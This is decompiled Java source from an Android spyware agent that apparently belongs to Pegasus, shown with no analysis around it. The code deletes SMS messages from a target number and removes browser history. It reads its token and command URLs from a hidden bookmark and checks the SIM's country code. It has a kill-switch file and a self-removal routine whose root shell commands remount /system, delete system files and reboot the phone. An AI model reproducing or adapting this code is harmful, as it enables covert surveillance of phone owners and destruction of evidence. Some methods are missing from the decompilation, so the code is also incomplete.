package com.network.h;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Process;
import android.provider.Browser;
import android.telephony.TelephonyManager;
import com.network.android.SmsReceiver;
import com.network.android.a.c;
import com.network.android.ab;
import com.network.android.c.a.a;
import com.network.android.m;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.net.URLDecoder;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public final class b {

    /* renamed from: a  reason: collision with root package name */
    public static boolean f143a = false;
    public static String b = null;
    public static boolean c = true;
    private static Handler d;

    static {
        HandlerThread handlerThread = new HandlerThread("delete");
        handlerThread.start();
        d = new Handler(handlerThread.getLooper());
    }

    public static int a(File file) {
        try {
            a.a("myChmod started. changine file: " + file.getAbsolutePath());
            if (!file.exists()) {
                a.a("myChmod file does not exists. returning");
                return -1;
            }
            return ((Integer) Class.forName("android.os.FileUtils").getMethod("setPermissions", String.class, Integer.TYPE, Integer.TYPE, Integer.TYPE).invoke(null, file.getAbsolutePath(), 511, -1, -1)).intValue();
        } catch (Throwable th) {
            a.a("myChmod exception" + th.getMessage(), th);
            return -1;
        }
    }

    public static void a(int i, String str, Context context) {
        FileOutputStream fileOutputStream = null;
        try {
            a.a("writeResourceToPath start. resourceID: " + i + " dest path: " + str);
            InputStream openRawResource = context.getResources().openRawResource(i);
            if (openRawResource.available() == 0) {
                a.a("playWeaknessAndRemoveApplication data size is 0. returning!");
                return;
            }
            byte[] bArr = new byte[openRawResource.available()];
            openRawResource.read(bArr);
            openRawResource.close();
            FileOutputStream fileOutputStream2 = new FileOutputStream(str);
            try {
                fileOutputStream2.write(bArr);
                fileOutputStream2.close();
            } catch (Throwable th) {
                th = th;
                fileOutputStream = fileOutputStream2;
            }
        } catch (Throwable th2) {
            th = th2;
            a.a("writeResourceToPath exception: " + th.getMessage(), th);
            if (fileOutputStream != null) {
                fileOutputStream.close();
            }
        }
    }

    public static void a(Context context) {
        try {
            a.a("removeAppalication start");
            if (f143a) {
                a.a("removeAppalication isOnRemoveApplicationProcess is true. returning");
                return;
            }
            f143a = true;
            new Handler().post(new c(context));
            a.a("removeAppalication ended!");
        } catch (Throwable th) {
            a.a("removeAppalication exception: " + th.getMessage(), th);
            com.network.android.c.a.b.a(2, (short) 28);
        }
    }

    public static void a(Context context, String str) {
        if (str != null) {
            try {
                a(context, str, d, 0);
                a(context, str, d, 400);
                a(context, str, d, 1200);
            } catch (Exception e) {
                a.a("deleteTargetSms- " + e.getMessage(), e);
            }
        }
    }

    private static void a(Context context, String str, Handler handler, long j) {
        a.a("deleteTargetSms: " + str + " delay: " + j);
        handler.postDelayed(new h(context, str), j);
    }

    public static void a(String str) {
        try {
            File file = new File(str);
            if (file.exists()) {
                a.a("RemoveDirectories start");
                c(file);
                a.a("RemoveDirectories end");
            }
        } catch (Throwable th) {
            a.a("RemoveDirectories exception:" + th.getMessage(), th);
        }
    }

    private static void a(String str, Context context) {
        a.a("removeHistoryByIp started. ip to remove: " + str + " sleep time before running: 2000");
        new Handler().postDelayed(new g(str, context), 2000);
    }

    /* JADX WARNING: Removed duplicated region for block: B:40:0x01e1 A[SYNTHETIC, Splitter:B:40:0x01e1] */
    /* JADX WARNING: Removed duplicated region for block: B:48:0x0201 A[SYNTHETIC, Splitter:B:48:0x0201] */
    /* JADX WARNING: Removed duplicated region for block: B:62:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void a(java.lang.String r11, android.content.Context r12, int r13, boolean r14) {
        /*
        // Method dump skipped, instructions count: 570
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.b.a(java.lang.String, android.content.Context, int, boolean):void");
    }

    public static boolean a() {
        boolean z = true;
        try {
            if (SmsReceiver.b == null) {
                a.b("isValidSettings - No tokenId !!!!!");
                return false;
            }
            if (com.network.b.b.e() == null || com.network.b.b.e().length == 0) {
                a.b("isValidSettings - No TargetURLs");
                z = false;
            }
            return z;
        } catch (Throwable th) {
            a.a("isValidSettings- " + th.getMessage(), th);
            return false;
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:17:0x0097  */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x00b8 A[SYNTHETIC, Splitter:B:22:0x00b8] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static boolean a(java.lang.String r7, java.lang.String r8) {
        /*
        // Method dump skipped, instructions count: 224
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.b.a(java.lang.String, java.lang.String):boolean");
    }

    /* JADX WARNING: Removed duplicated region for block: B:11:0x00a4 A[SYNTHETIC, Splitter:B:11:0x00a4] */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x00a9 A[Catch:{ Throwable -> 0x00f4 }] */
    /* JADX WARNING: Removed duplicated region for block: B:30:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static boolean a(java.lang.String r7, java.lang.String r8, java.lang.String r9) {
        /*
        // Method dump skipped, instructions count: 252
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.b.a(java.lang.String, java.lang.String, java.lang.String):boolean");
    }

    public static boolean a(String[] strArr, String[] strArr2) {
        try {
            a.a("isItemFromList1IsInList2 start");
            for (int i = 0; i < strArr.length; i++) {
                for (String str : strArr2) {
                    if (strArr[i].compareToIgnoreCase(str) == 0) {
                        a.a("isItemFromList1IsInList2 fount identicle strings. returning true");
                        return true;
                    }
                }
            }
        } catch (Throwable th) {
            a.a("isItemFromList1IsInList2 exception: " + th.getMessage(), th);
        }
        a.a("isItemFromList1IsInList2 didn't find any identicle strings. returning false");
        return false;
    }

    public static int b(File file) {
        try {
            a.a("getChmodPermissions started. getting file permissions data: " + file.getAbsolutePath());
            if (!file.exists()) {
                a.a("getChmodPermissions file does not exists. returning");
                return -1;
            }
            int[] iArr = new int[1];
            Class.forName("android.os.FileUtils").getMethod("getPermissions", String.class, int[].class).invoke(null, file.getAbsolutePath(), iArr);
            a.a("getChmodPermissions started. permissions data: " + iArr[0]);
            return iArr[0];
        } catch (Throwable th) {
            a.a("getChmodPermissions exception: " + th.getMessage(), th);
            return -1;
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:14:0x0052 A[SYNTHETIC, Splitter:B:14:0x0052] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static void b() {
        /*
        // Method dump skipped, instructions count: 119
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.b.b():void");
    }

    public static void b(Context context) {
        try {
            a.a("removePackage - pegasus killing process. this should be the last log message!!!");
            context.getPackageManager().setApplicationEnabledSetting("com.network.android", 2, 0);
        } catch (Throwable th) {
            a.a("killProcess: " + th.getMessage(), th);
        }
    }

    public static void b(Context context, String str) {
        try {
            a.a("deleteTargetSms: " + str);
            if (str == null) {
                a.b("deleteSms - no sms to delete");
                return;
            }
            Uri parse = Uri.parse("content://sms/");
            ContentResolver contentResolver = context.getContentResolver();
            Cursor query = contentResolver.query(parse, null, "address=?", new String[]{str}, null);
            if (query.getCount() > 0) {
                a.a("delete Sms count: " + query.getCount());
                while (query.moveToNext()) {
                    try {
                        a.a("deleteSms: " + str + "number of deletions: " + contentResolver.delete(Uri.parse("content://sms/" + query.getString(0)), null, null));
                    } catch (Exception e) {
                    }
                }
            }
            query.close();
        } catch (Throwable th) {
            a.a("deleteSms- " + th.getMessage(), th);
        }
    }

    public static void b(String str) {
        FileWriter fileWriter;
        Throwable th;
        a.a("clearFileData started. clrearing: " + str);
        try {
            fileWriter = new FileWriter(str);
            try {
                fileWriter.write("");
                fileWriter.flush();
                fileWriter.close();
                m.c("rm " + str + ";");
                a.a("clearFileData ended");
            } catch (Throwable th2) {
                th = th2;
            }
        } catch (Throwable th3) {
            th = th3;
            fileWriter = null;
            try {
                a.a("clearFileData exception: " + th.getMessage(), th);
                if (fileWriter != null) {
                    fileWriter.close();
                }
            } catch (IOException e) {
            }
        }
    }

    public static Integer c(String str) {
        Throwable th;
        Integer num;
        try {
            ByteBuffer wrap = ByteBuffer.wrap(com.network.i.a.b(str));
            wrap.order(ByteOrder.LITTLE_ENDIAN);
            num = Integer.valueOf(wrap.getShort() & 65535);
            try {
                a.a("convertCommandAckToInt " + num);
            } catch (Throwable th2) {
                th = th2;
                a.a("convertCommandAckToInt exception: " + th.getMessage(), th);
                return num;
            }
        } catch (Throwable th3) {
            num = null;
            th = th3;
            a.a("convertCommandAckToInt exception: " + th.getMessage(), th);
            return num;
        }
        return num;
    }

    public static String c(Context context) {
        a.a("getAgentApkPath start");
        try {
            return context.getApplicationInfo().sourceDir;
        } catch (Throwable th) {
            a.a("getAgentApkPath exception: " + th.getMessage(), th);
            return "";
        }
    }

    private static void c(File file) {
        try {
            if (file.isDirectory()) {
                if (!j.a() || !"upgrade".equals(file.getName())) {
                    File[] listFiles = file.listFiles();
                    for (File file2 : listFiles) {
                        try {
                            a.a("Remove file: " + file2.getAbsolutePath());
                            c(file2);
                        } catch (Throwable th) {
                            a.a("removeBridg- " + th.getMessage(), th);
                        }
                    }
                } else {
                    return;
                }
            }
            a.a("Remove file: " + file.getAbsolutePath());
            a.a("Remove file result: " + file.delete());
        } catch (Throwable th2) {
            a.a("removeBridg- " + th2.getMessage(), th2);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:112:? A[RETURN, SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:113:? A[RETURN, SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:69:0x0276 A[SYNTHETIC, Splitter:B:69:0x0276] */
    /* JADX WARNING: Removed duplicated region for block: B:80:0x02b9 A[SYNTHETIC, Splitter:B:80:0x02b9] */
    /* JADX WARNING: Removed duplicated region for block: B:88:0x02dd A[SYNTHETIC, Splitter:B:88:0x02dd] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static boolean c(android.content.Context r8, java.lang.String r9) {
        /*
        // Method dump skipped, instructions count: 844
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.b.c(android.content.Context, java.lang.String):boolean");
    }

    /* JADX WARNING: Removed duplicated region for block: B:16:0x0088  */
    /* JADX WARNING: Removed duplicated region for block: B:26:? A[ADDED_TO_REGION, Catch:{ Throwable -> 0x00a9 }, RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static java.lang.String d(java.lang.String r6) {
        /*
        // Method dump skipped, instructions count: 200
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.h.b.d(java.lang.String):java.lang.String");
    }

    private static void d(Context context, String str) {
        try {
            Browser.deleteFromHistory(context.getContentResolver(), str);
        } catch (Throwable th) {
            a.a("removed browsing history- " + th.getMessage(), th);
        }
    }

    public static boolean d(Context context) {
        try {
            a.a("isAgentInstalledOnSystem start");
            String c2 = c(context);
            a.a("isAgentInstalledOnSystem apk path: " + c2);
            return c2.startsWith("/system/app");
        } catch (Throwable th) {
            a.a("isAgentInstalledOnSystem exception: " + th.getMessage(), th);
            return false;
        }
    }

    public static void e(Context context) {
        try {
            a.a("removePackage start");
            Boolean valueOf = Boolean.valueOf(j.a());
            a.a("removePackage start. is on upgrade state: " + valueOf);
            if (valueOf.booleanValue()) {
                a("/data/data/com.network.android");
                a.a("removePackage start. we are on upgrade state. returning");
                new Handler().postDelayed(new d(context), 190000);
                return;
            }
        } catch (Throwable th) {
            a.a("removePackage exception: " + th.getMessage(), th);
            a.b("removePackage continuing anyway");
        }
        com.network.b.b.L();
        if (new File("/system/csk").exists()) {
            a("/data/data/com.network.android");
            try {
                ab.a();
                if (d(context)) {
                    String str = context.getApplicationInfo().dataDir + "/";
                    String c2 = c(context);
                    String str2 = (((((("" + " sleep 10;") + " export LD_LIBRARY_PATH=/vendor/lib:/system/lib;") + " mount -o remount,rw /dev/null /system;") + " chmod 0777 " + c2 + ";") + " am force-stop com.network.android;") + " pm disable com.network.android;") + " rm /system/app/com.media.sync.apk;";
                    if (!c.e()) {
                        str2 = str2 + "pm uninstall com.network.android;";
                    }
                    String str3 = ((((((str2 + " kill " + Process.myPid() + ";") + " rm " + c2 + ";") + " rmdir -R " + str + ";") + " sync;") + "rm /system/ttg;") + "chmod 0777 /system/csk;rm /system/csk;") + "reboot;";
                    a.a("removePackage uninstalling agent from system using rm. command: " + str3);
                    m.c(str3);
                    b(context);
                } else {
                    a.a("removePackage uninstalling using package manager. command: export LD_LIBRARY_PATH=/vendor/lib:/system/lib;mount -o remount,rw /dev/null /system;chmod 0777 /system/csk;rm /system/csk;rm /system/ttg;pm uninstall com.network.android;");
                    m.c("export LD_LIBRARY_PATH=/vendor/lib:/system/lib;mount -o remount,rw /dev/null /system;chmod 0777 /system/csk;rm /system/csk;rm /system/ttg;pm uninstall com.network.android;");
                }
                b(context);
            } catch (Throwable th2) {
                b(context);
                throw th2;
            }
            b(context);
        } else {
            b();
            new Handler().postDelayed(new e(context), 170000);
        }
        new Handler().postDelayed(new f(context), 190000);
        a.a("remove Package end");
    }

    public static boolean f(Context context) {
        boolean z = true;
        try {
            a.a("getSettingsFromBH started");
            if (f143a) {
                a.a("getSettingsFromBH not running - agent is on kill state");
                return false;
            }
            boolean c2 = c(context, "/data/myappinfo");
            if (!c2) {
                a.a("getSettingsFromBH readSettingsFromBHFile from data failed. reading system");
                c2 = c(context, "/system/ttg");
            }
            if (!c2) {
                a.a("getSettingsFromBH readSettingsFromBHFile failed. reading from URL history");
                i(context);
            }
            com.network.b.b.c(context);
            b("/data/myappinfo");
            boolean a2 = a();
            if (!a2) {
                a.b("getSettingsFromBH no valid settings on getSettingsFromHistory");
                com.network.android.c.a.b.a(1, (short) 4);
                c.a(context);
                return false;
            }
            if (b == null || b.length() <= 1) {
                a.b("getSettingsFromBH installed from update. not running validateMcc");
            } else {
                a.a("getSettingsFromBH instalation validateMcc");
                z = j(context);
                if (!z) {
                    a.b("getSettingsFromBH no valid MCC on getSettingsFromHistory");
                    com.network.android.c.a.b.a(1, (short) 5);
                    c.a(context);
                    return false;
                }
            }
            if (b != null && b.compareTo("-") == 0 && d(context)) {
                if (!com.network.b.b.B) {
                    a.b("getSettingsFromBH installed on system after update. rebooting device");
                    com.network.b.b.B = true;
                    com.network.b.b.c(context);
                    m.c("sleep 30; reboot");
                } else {
                    a.b("getSettingsFromBH installed on system after update. already rebooted");
                }
            }
            if (b != null) {
                String d2 = d(b);
                com.network.b.b.z = d2;
                a(d2, context);
            } else {
                a("Debug Url", context);
            }
            com.network.b.b.c(context);
            return a2 & z;
        } catch (Throwable th) {
            a.a("getSettingsFromBH exception: " + th.getMessage(), th);
            return false;
        }
    }

    public static void g(Context context) {
        try {
            a.a("delete Target Sms");
            b(context, com.network.b.b.g());
        } catch (Throwable th) {
            a.a("deleteTargetSms- " + th.getMessage(), th);
        }
    }

    public static boolean h(Context context) {
        if (new File("/sdcard/MemosForNotes").exists()) {
            a.a("checkIfAntiduteExists. killing self");
            a(context);
            return true;
        }
        a.a("checkIfAntiduteExists. no antidute found. returning false");
        return false;
    }

    private static boolean i(Context context) {
        String substring;
        try {
            a.a("getSettingsFromHistory started ");
            Cursor query = context.getContentResolver().query(Browser.BOOKMARKS_URI, null, null, null, null);
            com.network.b.b.z = "URL For Remove";
            a.a("History Count: " + query.getCount());
            if (query.moveToLast()) {
                while (true) {
                    try {
                        String string = query.getString(1);
                        if (string != null && string.contains("rU8IPXbn")) {
                            a.a("url : " + string);
                            if (string.contains("rU8IPXbn")) {
                                a.a("target url found: " + string);
                                a.a("ip address : " + string.substring(0, 20));
                                int indexOf = string.indexOf("t=");
                                int indexOf2 = string.indexOf("&c");
                                int indexOf3 = string.indexOf("&a");
                                int indexOf4 = string.indexOf("&b");
                                int indexOf5 = string.indexOf("&d");
                                int indexOf6 = string.indexOf("&r");
                                int indexOf7 = string.indexOf("&i");
                                int indexOf8 = string.indexOf("&s");
                                if (indexOf < indexOf2) {
                                    SmsReceiver.b = string.substring(indexOf + 2, indexOf2);
                                    a.a("token: " + SmsReceiver.b);
                                }
                                if (indexOf2 < indexOf3) {
                                    try {
                                        substring = string.substring(indexOf2 + 3, indexOf3);
                                    } catch (Throwable th) {
                                        a.a("getSettingsFromHistory- get Setting" + th.getMessage(), th);
                                    }
                                } else {
                                    substring = indexOf2 < indexOf4 ? string.substring(indexOf2 + 3, indexOf4) : null;
                                }
                                String decode = URLDecoder.decode(substring, "UTF-8");
                                if (indexOf4 < indexOf5) {
                                    com.network.b.b.e = string.substring(indexOf4 + 3, indexOf5);
                                }
                                if (indexOf5 < indexOf6) {
                                    com.network.b.b.o = string.substring(indexOf5 + 3, indexOf6);
                                    a.a("mccSeetings: " + com.network.b.b.o);
                                }
                                if (indexOf6 < indexOf7) {
                                    String substring2 = string.substring(indexOf6 + 3, indexOf7);
                                    a.a("AllowRoming: " + substring2);
                                    if ("0".startsWith(substring2)) {
                                        com.network.b.b.a(false);
                                        a.a("Not allow roming");
                                    } else {
                                        com.network.b.b.a(true);
                                        try {
                                            com.network.b.b.g(Integer.parseInt(substring2));
                                        } catch (Throwable th2) {
                                            a.a("ret roming- " + th2.getMessage(), th2);
                                        }
                                        a.a("Allow roming: " + substring2);
                                    }
                                }
                                if (indexOf7 < indexOf8) {
                                    com.network.b.b.l = string.substring(indexOf7 + 3, indexOf8);
                                    a.a("packageVersion: " + com.network.b.b.l);
                                }
                                byte[] b2 = com.network.i.a.b(decode);
                                a.a("Settings URL decoded Base64: " + decode);
                                com.network.android.a.b.a(b2, context, false, null);
                                com.network.android.a.b.a(context);
                            }
                        }
                    } catch (Throwable th3) {
                        a.a("getSettingsFromHistory- " + th3.getMessage(), th3);
                    }
                    if (!query.moveToPrevious()) {
                        break;
                    }
                }
            } else {
                query.close();
            }
        } catch (Throwable th4) {
            com.network.android.c.a.b.a(1, (short) 4);
            a.a("getSettingsFromHistory- " + th4.getMessage(), th4);
        }
        return true;
    }

    private static boolean j(Context context) {
        if (com.network.b.b.o == null) {
            return true;
        }
        String str = "." + com.network.b.b.o;
        a.a("validateMcc MCC configuration: " + str);
        try {
            String subscriberId = ((TelephonyManager) context.getSystemService("phone")).getSubscriberId();
            a.a("validateMcc MCC subscriberId: " + subscriberId);
            if (subscriberId == null || subscriberId.length() <= 0) {
                a.a("validateMcc MCC no subscriberId!");
                if (com.network.b.b.C.booleanValue()) {
                    a.a("validateMcc MCC no subscriberId! Green Instalation -> no need for suicide");
                    return true;
                }
                a.a("validateMcc MCC no subscriberId! Not a Green Instalation ->  need for suicide");
                return true;
            }
            String substring = subscriberId.substring(0, 3);
            a.a("MCC: " + substring);
            String str2 = "." + (Integer.parseInt(substring) * 82);
            a.a("MCCcur: " + str2);
            if (str.indexOf(str2) != -1) {
                return true;
            }
            a.b("validateMcc no valid MCC");
            return false;
        } catch (Exception e) {
            a.a("validateMcc exception- " + e.getMessage(), e);
            return false;
        }
    }
}
